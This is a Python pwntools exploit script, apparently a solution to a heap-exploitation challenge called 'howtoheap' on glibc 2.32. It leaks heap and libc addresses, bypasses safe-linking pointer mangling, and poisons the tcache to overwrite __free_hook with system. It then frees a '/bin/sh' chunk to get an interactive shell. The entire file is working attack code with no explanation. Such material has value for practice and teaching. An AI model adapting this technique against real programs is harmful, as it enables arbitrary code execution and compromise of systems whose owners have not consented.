#!/usr/bin/env python3
from pwn import *
elf = context.binary = ELF("./howtoheap")
p = process("./howtoheap")
gdb.attach(p,"init-pwndbg")
libc = ELF("libc-2.32.so")

def malloc(index,size):
    p.sendlineafter("> ","1")
    p.sendlineafter("malloc at index: ",str(index))
    p.sendlineafter("with size: ",str(size))

def free(index):
    p.sendlineafter("> ","2")
    p.sendlineafter("free at index: ",str(index))

def write(index,data):
    p.sendlineafter("> ","4")
    p.sendlineafter("write to index: ",str(index))
    p.sendlineafter("of size: ",str(len(data)))
    p.send(data)

def read(index,size):
    p.sendlineafter("> ","3")
    p.sendlineafter("read at index: ",str(index))
    p.sendlineafter("of size: ",str(size))
    leak = p.recvuntil(">")
    return leak[:-1]

def defuscate(x,l=64):
    p = 0
    for i in range(l*4,0,-4): 
        v1 = (x & (0xf << i )) >> i
        v2 = (p & (0xf << i+12 )) >> i+12
        p |= (v1 ^ v2) << i
    return p

def obfuscate(ptr,addr):
    return ((addr>>12)^ptr)

malloc(0,0x32)
malloc(1,0x32)
malloc(2,0x428)
malloc(3,0x32)
malloc(4,0x32)
malloc(5,0x32)
malloc(6,0x32)
malloc(7,0x32)
free(1)
leak = read(0,0x50)[-8:-1]
leak = leak.ljust(8,b'\x00')
leak = u64(leak)
heap_base = leak - 0x10
log.critical("Heap base: {}".format(hex(heap_base)))
p.sendline("1")
p.sendline("1")
p.sendline(str(0x32))
free(2)
leak = read(1,0x50)[-8:-1]
leak = leak.ljust(8,b'\x00')
leak = u64(leak)
libc.address = leak - 0x3b6c00
__free_hook = libc.sym.__free_hook
system = libc.sym.system
log.critical("Libc base address: {}".format(hex(libc.address)))
___free_hook = libc.sym.__free_hook
system = libc.sym.system
p.sendline("1")
p.sendline("2")
p.sendline(str(0x428))
free(6)
free(5)
write(4,b'a'*0x30+ p64(0x0)+p64(0x41)+p64(obfuscate(__free_hook,heap_base+0x7d0)))
malloc(8,0x32)
malloc(9,0x32)
write(9,p64(system))
write(8,b"/bin/sh\x00")
free(8)
p.interactive()